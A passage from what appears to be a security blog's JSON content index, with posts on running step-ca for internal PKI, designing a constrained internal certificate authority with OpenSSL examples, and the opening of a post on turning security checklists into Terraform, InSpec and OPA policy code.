steal\u0026rdquo;.\nA Practical Linux VM Setup (Systemd) This is the simplest deployment that still holds up:\na dedicated Linux VM step-ca running as its own user a firewall rule that only allows traffic from where it should be used backups of CA state (encrypted, tested restore) System hardening (minimum viable) don\u0026rsquo;t run it as root don\u0026rsquo;t expose the admin API to the internet log everything you can, because you will need it later Example systemd unit (trimmed for sanity):\n[Unit] Description=step-ca After=network.target [Service] User=step Group=step ExecStart=/usr/bin/step-ca /etc/step-ca/config/ca.json Restart=on-failure NoNewPrivileges=true PrivateTmp=true ProtectSystem=strict ProtectHome=true ReadWritePaths=/etc/step-ca /var/lib/step-ca [Install] WantedBy=multi-user.target The point is not to win a hardening contest. It\u0026rsquo;s to reduce the blast radius when someone inevitably gets a foothold somewhere.\nNetwork rules (the bit everyone forgets) If every developer laptop can hit your CA, someone will eventually script issuance until you notice your logs are on fire.\nLock it down:\nonly allow traffic from your networks and clusters if you have multiple environments, separate them (dev CA vs prod CA) Yes, this is annoying. It\u0026rsquo;s still less annoying than revoking half your estate because someone minted certs for *.prod.internal.\nProvisioners: How Do You Decide Who Gets a Cert? This is where most internal PKI goes wrong.\nIf your rule is \u0026ldquo;anyone who can reach the CA can get a cert\u0026rdquo;, you\u0026rsquo;ve built a certificate vending machine.\nProvisioners are the authentication and policy layer. Pick one based on how your services authenticate.\nCommon patterns:\n1. ACME (good default for services) ACME works well for:\nservices that can do automated renewal environments that already understand Let\u0026rsquo;s Encrypt style flows The two big decisions are:\nHTTP-01 vs DNS-01 (internal DNS is usually messy) what names are allowed (policy matters more than the challenge) 2. OIDC / JWT (good for workloads with identity) If your workloads already have identity tokens (cloud identity, workload identity, service accounts), use that. It gives you:\ntraceability (who requested what) policy based on claims 3. mTLS provisioners (good for controlled environments) If you already have a bootstrap trust (for example, a machine identity you trust), you can use mTLS to request new certs.\nIt works well for fleets. It also fails badly if your bootstrap identity leaks.\nPick one. Don\u0026rsquo;t enable everything \u0026ldquo;just in case\u0026rdquo;. That\u0026rsquo;s how you end up with three bypass paths nobody remembers.\nIssuance Policy: Stop Wildcards and Other Regrets You need to decide what you will issue. Write it down and enforce it.\nReasonable defaults:\nno wildcards in production short lifetimes (hours or days, not months) SANs must be within approved internal zones different provisioners for dev vs prod Example policy choices that save you later:\nissue separate intermediates per environment (dev, staging, prod) keep names boring (svc-name.namespace.svc.cluster.local, service.prod.internal) ban random personal vanity names (they will end up in production somehow) Renewal: The Bit That Makes Or Breaks This If renewal is not automatic, the CA will become a calendar reminder system.\nFor Linux services, the most boring approach is usually best:\na small renewal script a systemd timer reload the service when the cert rotates Example shape:\nstep ca renew /etc/tls/service.crt /etc/tls/service.key \\ --ca-url https://ca.prod.internal:443 \\ --root /etc/step-ca/certs/root_ca.crt systemctl reload your-service The important part is not the command. It\u0026rsquo;s the behaviour:\nrenew before expiry alert when renewal fails don\u0026rsquo;t schedule every cert to renew at the same time Expiry storms are self-inflicted outages. Spread renewal. Use jitter. Your future self will thank you.\nBackups and Recovery (Because This Will Go Wrong) You need to answer one question:\n\u0026ldquo;If this VM dies, how do we keep issuing certs?\u0026rdquo;\nBack up:\nstep-ca state (database) configuration issuing keys (intermediate) and password material (securely) the root and intermediate certificates (public) Rules:\nencrypt backups restrict access (least privilege) test restore, not just backup If you can\u0026rsquo;t restore, you don\u0026rsquo;t have backups. You have feelings.\nMonitoring: The Few Things Worth Alerting On You don\u0026rsquo;t need 40 dashboards. You need a few signals:\nissuance rate (spikes can indicate abuse) renewal failure rate CA availability and latency certificate expiry in critical systems (external check) And you want a list of:\nwhich services have certs from which intermediate where trust roots are deployed When you rotate intermediates, this is the difference between a controlled change and a two-week scavenger hunt.\nConcrete Prometheus Setup Export metrics from step-ca via the /metrics endpoint (enable in config). Then alert on:\ngroups: - name: step-ca rules: - alert: StepCADown expr: up{job=\u0026#34;step-ca\u0026#34;} == 0 for: 2m labels: severity: critical annotations: summary: \u0026#34;step-ca is down\u0026#34; - alert: StepCACertificateIssuanceSpike expr: | rate(step_ca_certificates_issued_total[5m]) \u0026gt; 10 * (rate(step_ca_certificates_issued_total[5m] offset 1h)) for: 5m labels: severity: warning annotations: summary: \u0026#34;Unusual certificate issuance rate\u0026#34; - alert: StepCACertificateRenewalFailures expr: rate(step_ca_renewal_failures_total[5m]) \u0026gt; 0 for: 5m labels: severity: warning annotations: summary: \u0026#34;Certificate renewals failing\u0026#34; Quick CLI check:\ncurl -s http://ca.prod.internal:9000/metrics | grep step_ca curl -s http://ca.prod.internal:9000/health What Actually Breaks 1. Trust distribution Issuing certs is the easy part. Getting everything to trust your CA chain is the work.\nYou will find:\ncontainers with their own CA bundles Java apps with a private trust store nobody remembers appliances that can\u0026rsquo;t be updated without a support ticket Write down how trust gets deployed for:\nLinux hosts (/usr/local/share/ca-certificates, whatever your distro uses) containers (bake into base images, don\u0026rsquo;t hotfix) JVM apps (decide a pattern and enforce it) 2. Names and SAN sprawl Someone will request a cert with 14 SANs because \u0026ldquo;it was easier\u0026rdquo;. That cert will leak somewhere. Now you have a single private key that unlocks half your estate.\nKeep SANs tight. If something needs multiple names, ask why.\n3. DNS and split-horizon surprises ACME challenges and service identity both depend on DNS. If your internal DNS is split across clouds, VPNs, and cluster DNS, this becomes a steady source of pain.\nIf you want a dedicated DNS post: DNS Security: What Actually Breaks.\n4. \u0026ldquo;We migrated the CA\u0026rdquo; outages This is the classic:\nnew CA deployed new intermediate created half the services start issuing from the new chain trust roots not deployed everywhere some clients now see an untrusted chain and fail hard Fix:\ndeploy trust first then switch issuance keep the old intermediate around long enough for existing certs to age out Don\u0026rsquo;t flip everything in one day unless you like incident bridges.\nKey Storage: The Hard Truth If you can, use hardware-backed keys for the intermediate.\nIf you can\u0026rsquo;t, at least:\nlock down filesystem permissions separate the CA VM from general workloads avoid putting key material in build pipelines The intermediate key is the crown jewels for issuance. Treat it that way.\nThe Boring Truth step-ca is not magic. It\u0026rsquo;s a decent tool that makes internal PKI survivable.\nIf you want it to stay survivable:\nkeep the root offline lock down who can request what make renewal boring and automatic back it up and test restore plan trust distribution like it\u0026rsquo;s a deployment, because it is If you do those, internal PKI becomes a background service. Quiet. Predictable. Slightly irritating. Which is exactly how you want it.\n","date":"28 Oct 2025","permalink":"https://gazsecops.github.io/posts/stepca-running-internal-pki/","summary":"\u003cp\u003eIf you read my post on building your own CA and thought \u0026ldquo;fine, but how do I actually issue certs without becoming the Certificate Person\u0026rdquo;, this is the next step.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003estep-ca\u003c/code\u003e (Smallstep Certificate Authority) is the bit that makes internal PKI usable: automated issuance, short-lived certs, predictable renewal, and enough policy to stop someone minting a wildcard for your entire estate.\u003c/p\u003e\n\u003cp\u003eIt also gives you a new thing to break at 3am.\u003c/p\u003e\n\u003cdiv class=\"dialogue\"\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-oncall\"\u003eOn-call:\u003c/span\u003e Everything that talks TLS is failing.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-engineer\"\u003eEngineer:\u003c/span\u003e But we rotated the certs yesterday.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e You rotated them to a CA chain nobody trusts. Also the CA is down.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e How can the CA being down break existing connections?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e It doesn\u0026rsquo;t. The expiry storm you scheduled does.\u003c/p\u003e\n\u003c/div\u003e\n\u003caside class=\"pullquote\"\u003e\nInternal PKI fails in three ways: you lose the keys, you lose the trust, or you lose control of issuance.\n\u003c/aside\u003e\n\u003cp\u003eThis post covers a practical \u003ccode\u003estep-ca\u003c/code\u003e setup on a Linux VM, what to lock down, how to issue and renew certs, and the failure modes I\u0026rsquo;ve seen in the wild.\u003c/p\u003e","tags":["security","pki","tls","certificates","linux","cloud","operations"],"title":"Smallstep step-ca: Running Internal PKI Without Losing Your Mind"},{"content":" Management: We just need to issue some internal certs. How hard can it be?\nSysadmin: Hard enough that you\u0026rsquo;ll be arguing about wildcards and trust stores in 18 months.\nFamous last words. Eighteen months later, you\u0026rsquo;re dealing with wildcard certs everywhere, browsers rejecting perfectly valid certificates, and nobody understands why the monitoring system stopped working after a cert renewal.\nInternal PKI isn\u0026rsquo;t hard because the cryptography is complex. It\u0026rsquo;s hard because most organizations skip the guardrails that make PKI safe to operate at scale.\n\"A CA without constraints is like giving everyone admin access and hoping they'll be responsible. Works fine until it doesn't.\" This is about building internal PKI properly. Not the minimum viable certificate authority. The kind that doesn\u0026rsquo;t explode when someone makes a mistake.\nThe Problem With Most Internal PKI I\u0026rsquo;ve seen this pattern at dozens of organizations:\nTeam needs internal TLS certificates Someone spins up a CA (OpenSSL, easy-rsa, whatever) CA has no constraints, no guardrails, no policies Wildcard cert gets issued for *.company.com Wildcard cert gets copied everywhere Cert expires, everything breaks Or worse: cert gets leaked, nobody knows where it\u0026rsquo;s used The problem isn\u0026rsquo;t the CA itself. The problem is treating internal PKI as \u0026ldquo;just some certs\u0026rdquo; instead of critical security infrastructure.\nWeb PKI vs Internal PKI Let\u0026rsquo;s start with what you\u0026rsquo;re NOT building: a publicly-trusted CA.\nWeb PKI (public CAs):\nTrusted by browsers out of the box Subject to CA/Browser Forum (CABF) rules Requires WebTrust or ETSI audits Maximum 398-day certificate validity Certificate Transparency (CT) logs mandatory OCSP or CRL distribution required Heavy compliance burden Internal PKI (what you\u0026rsquo;re building):\nNot trusted by browsers by default No mandatory audits You set validity periods No CT logs required You decide revocation strategy Lighter compliance burden But here\u0026rsquo;s the trap: just because you CAN skip Web PKI rules doesn\u0026rsquo;t mean you SHOULD.\nModern internal PKI should adopt the same guardrails as Web PKI. Not because browsers require it. Because these guardrails prevent catastrophic mistakes.\nThe Guardrails You Need 1. Name Constraints What they do: Restrict which domains or IP ranges your CA can issue certificates for.\nWhy you need them: Without name constraints, your internal CA can issue certificates for ANY domain. Including google.com, amazon.com, or your competitor\u0026rsquo;s domain.\n\u0026ldquo;But we\u0026rsquo;d never issue for external domains!\u0026rdquo;\nMistakes happen. Automated systems misfire. Attackers compromise intermediates. Name constraints prevent these mistakes from becoming incidents.\nExample name constraints:\nPermitted: DNS: .internal.company.com DNS: .svc.cluster.local IP: 10.0.0.0/8 IP: 172.16.0.0/12 Excluded: DNS: .com DNS: .net DNS: .org DNS: .uk This CA can ONLY issue for internal domains and RFC 1918 IP ranges. Cannot issue for public domains. Cannot issue for external IPs.\nWhere to apply constraints:\nNOT on the root CA (too restrictive, hard to fix) ON intermediate CAs (perfect balance) Different intermediates for different namespaces I\u0026rsquo;ve seen organizations with:\nIntermediate 1: .internal.company.com only Intermediate 2: .svc.cluster.local (Kubernetes) Intermediate 3: 10.0.0.0/8 (infrastructure) Each intermediate can only issue for its designated namespace. Compromise of one doesn\u0026rsquo;t affect others.\nWhat this looks like in OpenSSL:\nIf you\u0026rsquo;re signing an intermediate with OpenSSL, you can enforce name constraints in the intermediate certificate.\nExample nameConstraints extension:\n# intermediate.ext (snippet) basicConstraints = critical,CA:true,pathlen:0 keyUsage = critical,keyCertSign,cRLSign nameConstraints = critical,@nc [nc] permitted;DNS.0 = .internal.company.com permitted;DNS.1 = .svc.cluster.local permitted;IP.0 = 10.0.0.0/255.0.0.0 permitted;IP.1 = 172.16.0.0/255.240.0.0 If you\u0026rsquo;ve never done this before: test it. Clients vary in how they handle name constraints. \u0026ldquo;We put it in the cert\u0026rdquo; is not the same as \u0026ldquo;it actually blocks issuance/misuse\u0026rdquo;.\n2. Extended Key Usage (EKU) What it does: Defines what a certificate can be used for.\nCommon EKU values:\nTLS Web Server Authentication - HTTPS servers TLS Web Client Authentication - Client certificates Code Signing - Signing binaries Email Protection - S/MIME Time Stamping - Timestamping services Why you need it: A certificate intended for TLS servers shouldn\u0026rsquo;t be usable for code signing. Or client authentication. Or email encryption.\nWithout EKU restrictions:\nServer cert gets copied to developer laptop for client auth Same cert used for TLS server AND code signing Cert intended for staging ends up in production Example:\n# Server certificate EKU: TLS Web Server Authentication # Client certificate EKU: TLS Web Client Authentication # Intermediate CA EKU: Certificate Sign, CRL Sign Be specific. One purpose per certificate. Makes revocation easier (you know exactly what breaks).\n3. Key Usage (KU) Works alongside EKU. Defines cryptographic operations allowed.\nCommon KU values:\nDigital Signature - Can sign data Key Encipherment - Can encrypt session keys Key Agreement - Can perform key agreement Certificate Sign - Can sign certificates (CAs only) CRL Sign - Can sign CRLs (CAs only) Leaf certificate example:\nKU: Digital Signature, Key Encipherment EKU: TLS Web Server Authentication Can do TLS handshakes. Cannot sign other certificates. Cannot sign CRLs.\nCA certificate example:\nKU: Certificate Sign, CRL Sign Critical: Yes Can sign certificates and CRLs. Cannot be used for TLS directly. Critical flag means clients MUST understand this extension.\n4. Path Length Constraints What it does: Controls how many intermediate CAs can exist below this CA.\nBasic Constraints: CA: TRUE pathlen: 1 This CA can issue one level of intermediates. Those intermediates cannot issue further intermediates (their pathlen would be 0).\nWhy you need it: Prevents rogue teams from spinning up their own sub-CAs without oversight.\nTypical structure:\nRoot CA: pathlen: 2 (can issue intermediates that issue intermediates) Intermediate CA: pathlen: 0 (cannot issue further intermediates) Leaf certificates: Not a CA Without path length constraints, any intermediate can create its own subordinate hierarchy. Compromised intermediate = uncontrolled certificate issuance.\n5. Validity Periods Recommended limits:\nRoot CA: 20 years (rarely changes, pain to replace) Intermediate CA: 5 years (balanced between stability and risk) Leaf certificates: 30-90 days (short-lived, automated renewal) \u0026ldquo;But Web PKI allows 398 days!\u0026rdquo;\nYou can do better. Internal PKI with automation should use short-lived certificates:\nBenefits of 30-day certificates:\nCompromised cert expires quickly Revocation less critical (just wait for expiry) Forces automation (manual renewal doesn\u0026rsquo;t scale) Leaked private keys have limited window Objections I\u0026rsquo;ve heard:\nEngineer: 30 days is too short. What if automation breaks?\nSysadmin: Then you fix automation. That\u0026rsquo;s the point. Forces you to have working automation.\nEngineer: But manual renewal worked fine for 3-year certs.\nSysadmin: Until someone left the company and nobody knew where certs were deployed. Then everything broke. Short certs force you to track them.\nShort-lived certificates are a feature, not a bug. They force operational discipline.\nBrowser Behavior and Trust Your internal CA will NOT be trusted by browsers by default. This is expected.\nOptions for trust:\nInstall root CA in OS trust store - Works for corporate managed devices Configure application to trust CA - mTLS, API clients, internal tools Don\u0026rsquo;t use it for browser-facing services - Use Let\u0026rsquo;s Encrypt or public CA instead What breaks if you try to use internal CA for public services:\nBrowsers reject certificates (unknown CA) Mobile apps fail to connect Third-party integrations break Certificate Transparency checks fail Customers see scary warnings Internal CA is for INTERNAL services. If it touches the public internet, use a public CA.\nInstalling Trust (The Bit Everyone Forgets) If you\u0026rsquo;re using an internal CA for browser-facing internal services, you need the root CA in the trust store.\nDo this with your device management tooling (MDM / Group Policy / whatever). But for one-off testing, here are the usual commands.\nDebian/Ubuntu:\nsudo install -m 0644 root-ca.crt /usr/local/share/ca-certificates/company-root-ca.crt sudo update-ca-certificates RHEL/CentOS/Fedora:\nsudo install -m 0644 root-ca.crt /etc/pki/ca-trust/source/anchors/company-root-ca.crt sudo update-ca-trust macOS:\nsudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain root-ca.crt Windows (elevated prompt):\ncertutil -addstore -f Root root-ca.crt If that made you wince, good. Trust distribution is operational work. Treat it like a rollout, not a copy-paste job.\nCommon Mistakes and How to Avoid Them Mistake 1: Wildcard Certificates Everywhere \u0026ldquo;Let\u0026rsquo;s just issue *.company.com and use it everywhere!\u0026rdquo;\nNo.\nProblems with wildcards:\nSingle certificate covers everything (huge blast radius) Gets copied everywhere (tracking becomes impossible) Compromised cert affects all subdomains Revocation impacts everything simultaneously No way to know what\u0026rsquo;s using it Better approach:\nSpecific certificates per service Automation handles issuance Centralized tracking of what\u0026rsquo;s deployed where Revocation affects only one service Mistake 2: No Certificate Inventory \u0026ldquo;Where are all our certificates?\u0026rdquo;\n\u0026ldquo;Um\u0026hellip;\u0026rdquo;\nIf you can\u0026rsquo;t list every certificate issued by your CA, you have a problem.\nMinimum tracking needed:\nCertificate serial number Subject (CN, SANs) Issued to (team, service, system) Expiry date Current status (valid, revoked, expired) Renewal automation status I\u0026rsquo;ve seen organizations with thousands of certificates and zero inventory. Certificate expires, nobody knows where it\u0026rsquo;s used, services break, firefighting ensues.\nMistake 3: Manual Renewal Process \u0026ldquo;Just set a calendar reminder to renew.\u0026rdquo;\nThis doesn\u0026rsquo;t scale. This WILL fail.\nAt 10 certificates: Manual renewal barely works At 100 certificates: Manual renewal constantly breaks At 1000 certificates: Manual renewal is impossible\nAutomation requirements:\nAutomatic certificate renewal before expiry Monitoring of renewal success/failure Alerting when renewal fails Rollback plan when new cert breaks service Testing of new certificates before deployment If you\u0026rsquo;re renewing certificates manually, you\u0026rsquo;re doing it wrong.\nMistake 4: Private Keys Stored in Git \u0026ldquo;Let\u0026rsquo;s commit the cert and key to the repo for easy deployment.\u0026rdquo;\nNo. Never. Absolutely not.\nProblems:\nGit history persists forever (even if you delete the file) Everyone with repo access has the private key Compromised key can\u0026rsquo;t be uncompromised Rotation becomes impossible Proper key storage:\nHSM for CA keys (hardware security module) Secrets management for service keys (Vault, KMS, etc.) Automated rotation No keys in version control, ever Mistake 5: No Revocation Strategy \u0026ldquo;We\u0026rsquo;ll just wait for the cert to expire.\u0026rdquo;\nWhat if:\nPrivate key is compromised Service is decommissioned Certificate was issued incorrectly Compliance requires immediate revocation You need revocation that works:\nOCSP (Online Certificate Status Protocol):\nReal-time certificate status checks Requires OCSP responder infrastructure Privacy concerns (CA knows when cert is checked) CRL (Certificate Revocation List):\nPeriodically updated list of revoked certs Simpler to implement Clients need to fetch and cache CRLs Latency between revocation and enforcement OCSP Stapling:\nServer fetches OCSP response Includes response in TLS handshake Reduces privacy concerns Better performance For internal PKI, CRL is often sufficient. For high-security environments, OCSP with stapling.\nPractical Implementation Architecture Three-tier hierarchy:\nRoot CA (offline, air-gapped) | +-- Intermediate CA 1 (.internal.company.com) | | | +-- Leaf certificates | +-- Intermediate CA 2 (.svc.cluster.local) | +-- Leaf certificates Root CA characteristics:\nKept offline (air-gapped if possible) Only used to sign intermediates 20-year validity Strong key protection (HSM) Intermediate CA characteristics:\nOnline, automated issuance 5-year validity Name constraints applied Path length = 0 Specific EKU restrictions Leaf certificates:\n30-90 day validity Automated renewal Specific to single service Monitored for expiry Tooling Don\u0026rsquo;t roll your own CA (unless you really know what you\u0026rsquo;re doing).\nModern options:\nSmallstep - Excellent for internal PKI, good defaults HashiCorp Vault PKI - If you\u0026rsquo;re already using Vault AWS Certificate Manager Private CA - Managed service GCP Certificate Authority Service - Another managed option These tools provide:\nProper constraint handling ACME protocol support (Let\u0026rsquo;s Encrypt-style automation) Certificate lifecycle management Audit logging Revocation infrastructure If you want the practical setup steps, I wrote them up here:\nSmallstep step-ca: Running Internal PKI Without Losing Your Mind If you must use OpenSSL:\nUse configuration files for constraints Script everything (manual commands breed mistakes) Test constraints before issuing production certs Maintain detailed documentation Key Ceremonies For the root CA key generation, be paranoid:\nMinimum ceremony:\nOffline computer (air-gapped) Documented witness (2+ people present) Video recording of process Hardware random number generator Secure storage (HSM or encrypted offline storage) Steps:\nGenerate root key on offline system Create self-signed root certificate Apply constraints before any issuance Back up root key (encrypted, multiple locations) Document recovery process Test recovery process Store root key offline If you want a minimal OpenSSL ceremony (offline root, online intermediate), this is the rough shape:\nGenerate a root CA key (offline):\numask 077 openssl genpkey -algorithm EC -pkeyopt ec_paramgen_curve:P-256 -out root-ca.key Create a self-signed root certificate (offline):\nopenssl req -x509 -new -sha256 \\ -key root-ca.key \\ -days 7300 \\ -subj \u0026#34;/C=GB/O=Example Ltd/CN=Example Root CA\u0026#34; \\ -out root-ca.crt Generate an intermediate key (online):\numask 077 openssl genpkey -algorithm EC -pkeyopt ec_paramgen_curve:P-256 -out intermediate.key Create an intermediate CSR (online):\nopenssl req -new -sha256 \\ -key intermediate.key \\ -subj \u0026#34;/C=GB/O=Example Ltd/CN=Example Issuing CA (prod)\u0026#34; \\ -out intermediate.csr Sign the intermediate with the root (offline), applying constraints:\nopenssl x509 -req -sha256 \\ -in intermediate.csr \\ -CA root-ca.crt \\ -CAkey root-ca.key \\ -CAcreateserial \\ -days 1825 \\ -extfile intermediate.ext \\ -out intermediate.crt This is not a full CA setup. It\u0026rsquo;s enough to show the guardrails in the certificate itself. If you\u0026rsquo;re going to run OpenSSL as your CA, use a proper openssl ca config and database and script the whole thing.\nFor intermediates:\nCan be generated online Protected by HSM or KMS Automated if using managed services Still requires secure backup Monitoring and Maintenance What to monitor:\nCertificate expiry (30 days, 7 days, 1 day warnings) Failed renewal attempts Revocation list size (growing unexpectedly?) OCSP responder availability Certificate issuance rate (anomaly detection) Name constraint violations (should be zero) Regular maintenance:\nReview issued certificates (monthly) Audit name constraints (quarterly) Test revocation process (quarterly) Update CRLs (daily or on-demand) Rotate intermediate keys (every 2-3 years) Review and update documentation (annually) Revocation That People Actually Use Most internal environments don\u0026rsquo;t do revocation well. The usual story is \u0026ldquo;we\u0026rsquo;ll just wait for expiry\u0026rdquo; - right up until a key leaks and you need it now.\nIf you\u0026rsquo;re running an OpenSSL-based CA, CRLs are the least bad option.\nThe moving parts you need:\nA published CRL URL (HTTP(S) somewhere stable) Certificates that include that CRL distribution point A process that updates the CRL often enough that \u0026ldquo;revoke\u0026rdquo; means something Example OpenSSL commands (requires you to be using openssl ca with an index/database):\n# Revoke a leaf certificate openssl ca -config ca.cnf -revoke certs/service.crt # Generate an updated CRL openssl ca -config ca.cnf -gencrl -out crl/intermediate.crl Then publish crl/intermediate.crl at a predictable URL (for example https://pki.internal/crl/intermediate.crl) and include it in issued certs:\n# ca.cnf (snippet) crlDistributionPoints = URI:https://pki.internal/crl/intermediate.crl If you don\u0026rsquo;t publish CRLs, or you publish them once a month, revocation is theatre.\nWhen Things Go Wrong Compromised Private Key Revoke certificate immediately Add to CRL/update OCSP Issue new certificate with new key Investigate how compromise occurred Review other certificates for similar exposure Expired Root Certificate This is bad. Really bad.\nIf your root CA expires:\nAll certificates become invalid All intermediates become invalid Everything breaks simultaneously Prevention:\nRoot CA validity: 20+ years Calendar reminders 5 years before expiry Documented renewal process Test renewal process in staging If it happens:\nGenerate new root (different key) Issue new intermediates Re-issue all leaf certificates Update trust stores everywhere Pain and suffering Lost Private Key If you lose the CA private key:\nCan\u0026rsquo;t issue new certificates Can\u0026rsquo;t revoke certificates Can\u0026rsquo;t sign CRLs Need to start over with new CA Prevention:\nMultiple encrypted backups Stored in different physical locations Documented recovery process Regular recovery testing (actually restore from backup) Compliance and Audit Even for internal PKI, document your practices:\nMinimum documentation:\nCertificate policy (CP) Certificate practice statement (CPS) Key generation procedures Certificate issuance procedures Revocation procedures Key storage and protection Disaster recovery plan Not because auditors demand it (they might). Because future-you will need it when something breaks.\nSummary Building internal PKI properly requires:\nName constraints - Lock CA to internal namespaces EKU/KU restrictions - One purpose per certificate Path length limits - Prevent uncontrolled sub-CAs Short validity - 30-90 days for leaf certificates Automation - Manual renewal doesn\u0026rsquo;t scale Revocation - CRL or OCSP that actually works Monitoring - Know when certificates expire Inventory - Track every issued certificate Documentation - Future-you will thank present-you Don\u0026rsquo;t:\nUse wildcard certificates everywhere Store private keys in git Skip name constraints Manually renew certificates Assume \u0026ldquo;internal\u0026rdquo; means \u0026ldquo;low risk\u0026rdquo; Do:\nApply same rigor as Web PKI Automate everything possible Use modern tooling (Smallstep, Vault, managed services) Test disaster recovery Document everything Internal PKI isn\u0026rsquo;t hard because of cryptography. It\u0026rsquo;s hard because of operational discipline.\nMost organizations skip the guardrails, hoping they won\u0026rsquo;t need them. Then they need them. Then it\u0026rsquo;s too late.\nBuild your internal CA properly from the start. Future-you will appreciate it.\nBased on building and operating internal PKI at organizations ranging from startups to global banks. The mistakes are real. The fixes work.\n","date":"15 Oct 2025","permalink":"https://gazsecops.github.io/posts/building-your-own-ca/","summary":"\u003cdiv class=\"dialogue\"\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e We just need to issue some internal certs. How hard can it be?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e Hard enough that you\u0026rsquo;ll be arguing about wildcards and trust stores in 18 months.\u003c/p\u003e\n\u003c/div\u003e\n\u003cp\u003eFamous last words. Eighteen months later, you\u0026rsquo;re dealing with wildcard certs everywhere, browsers rejecting perfectly valid certificates, and nobody understands why the monitoring system stopped working after a cert renewal.\u003c/p\u003e\n\u003cp\u003eInternal PKI isn\u0026rsquo;t hard because the cryptography is complex. It\u0026rsquo;s hard because most organizations skip the guardrails that make PKI safe to operate at scale.\u003c/p\u003e\n\u003caside class=\"pullquote\"\u003e\n\"A CA without constraints is like giving everyone admin access and hoping they'll be responsible. Works fine until it doesn't.\"\n\u003c/aside\u003e\n\u003cp\u003eThis is about building internal PKI properly. Not the minimum viable certificate authority. The kind that doesn\u0026rsquo;t explode when someone makes a mistake.\u003c/p\u003e","tags":["pki","security","tls","certificates","infrastructure"],"title":"Building Your Own CA: Guardrails, Browser Trust, and Why Most Internal PKI is Broken"},{"content":"\u0026ldquo;Here\u0026rsquo;s the security checklist for the new release.\u0026rdquo;\n\u0026ldquo;We\u0026rsquo;re deploying next week. When can we do the review?\u0026rdquo;\n\u0026ldquo;The review takes two weeks minimum. You scheduled it last month.\u0026rdquo;\n\u0026ldquo;\u0026hellip;we didn\u0026rsquo;t.\u0026rdquo;\nThis is the problem with security checklists. They\u0026rsquo;re designed for a world where you deploy quarterly. In continuous deployment environments, they\u0026rsquo;re the wrong tool.\n\"Security checklists codify knowledge but don't scale. Security as Code codifies requirements into executable tests. Checklists tell you what to check. Code checks it for you, every time.\" The evolution from checklists to code isn\u0026rsquo;t about abandoning security knowledge. It\u0026rsquo;s about making security verification scale with modern development practices.\nWhat Checklists Actually Do Before we get into how to transform them, acknowledge what they did well.\nKnowledge codification:\nSecurity checklists captured institutional knowledge. Someone understood a requirement (like \u0026ldquo;databases must encrypt sensitive fields\u0026rdquo;) and wrote it down. New engineers didn\u0026rsquo;t have to rediscover that knowledge every time.\nConsistent evaluation:\nDifferent people reviewing the same system could reach different conclusions. Checklists created a common language and consistent criteria, reducing this variance.\nCompliance mapping:\nWell-designed checklists mapped requirements to regulatory frameworks. GDPR, PCI-DSS, SOC2 - these things map to checklist items in ways that make sense.\nThe problem wasn\u0026rsquo;t the checklist itself. The problem was how checklists were used.\nThe Limitation: Manual Verification Manual verification doesn\u0026rsquo;t scale.\nSysadmin: Did you check the password complexity policy in the new microservice?\nEngineer: Yes, it requires 12 characters with special chars.\nSysadmin: How did you verify?\nEngineer: I tried setting a password with 8 characters and it was rejected.\nSysadmin: Good. That\u0026rsquo;ll pass the review then.\nThis conversation happens constantly. Verification by attempting to break controls. It\u0026rsquo;s slow. It\u0026rsquo;s manual. It doesn\u0026rsquo;t happen on every deploy.\nAnd it only catches things you think to test.\nThe Bridge: From Checklist to Code Security as Code isn\u0026rsquo;t about throwing away checklists. It\u0026rsquo;s about transforming checklist items into code that runs automatically.\nTransformation Example 1: Password Policy Checklist item: \u0026ldquo;Applications must enforce password complexity: minimum 12 characters, uppercase, lowercase, numbers, special characters.\u0026rdquo;\nManual verification: Someone checks configuration settings or tries to set a weak password.\nAs code (policy definition):\nresource \u0026#34;aws_iam_password_policy\u0026#34; \u0026#34;strict\u0026#34; { minimum_password_length = 12 require_lowercase_characters = true require_uppercase_characters = true require_numbers = true require_symbols = true allow_users_to_change_password = true } As code (verification):\ncontrol \u0026#39;password-policy-1\u0026#39; do impact 0.7 title \u0026#39;Password Policy Configuration\u0026#39; describe aws_iam_password_policy do it { should exist } its(\u0026#39;minimum_password_length\u0026#39;) { should be \u0026gt;= 12 } it { should require_uppercase_characters } it { should require_lowercase_characters } it { should require_numbers } it { should require_symbols } end end What changed:\nVerification now runs automatically in CI/CD Policy is defined as code (version controlled) Test is repeatable and consistent Transformation Example 2: Network Segmentation Checklist item: \u0026ldquo;Database servers must not be directly accessible from the public internet.\u0026rdquo;\nManual verification: Someone tries to connect from an external IP or checks firewall rules.\nAs code (policy definition):\nresource \u0026#34;aws_security_group\u0026#34; \u0026#34;database\u0026#34; { name = \u0026#34;database-sg\u0026#34; description = \u0026#34;Security group for database instances\u0026#34; vpc_id = aws_vpc.main.id ingress { from_port = 3306 to_port = 3306 protocol = \u0026#34;tcp\u0026#34; security_groups = [aws_security_group.application.id] } egress { from_port = 0 to_port = 0 protocol = \u0026#34;-1\u0026#34; cidr_blocks = [\u0026#34;0.0.0.0/0\u0026#34;] } } As code (verification):\npackage terraform.analysis import input.plan as tfplan deny[msg] { sg = tfplan.resource_changes[_] sg.type == \u0026#34;aws_security_group\u0026#34; sg.change.after.ingress[_].cidr_blocks[_] == \u0026#34;0.0.0.0/0\u0026#34; sg.change.after.ingress[_].to_port == 3306 msg = sprintf( \u0026#34;Security group \u0026#39;%s\u0026#39; allows public access to database port 3306\u0026#34;, [sg.change.after.name] ) } What changed:\nNetwork isolation defined declaratively Policy verification runs automatically on infrastructure changes Prevents drift (can\u0026rsquo;t manually open port after policy is set) Transformation Example 3: Encryption at Rest Checklist item: \u0026ldquo;All sensitive data must be encrypted at rest using approved algorithms.\u0026rdquo;\nManual verification: Someone checks database configuration, storage settings, documentation.\nAs code (policy definition):\nresource \u0026#34;aws_s3_bucket\u0026#34; \u0026#34;data\u0026#34; { bucket = \u0026#34;sensitive-data-bucket\u0026#34; 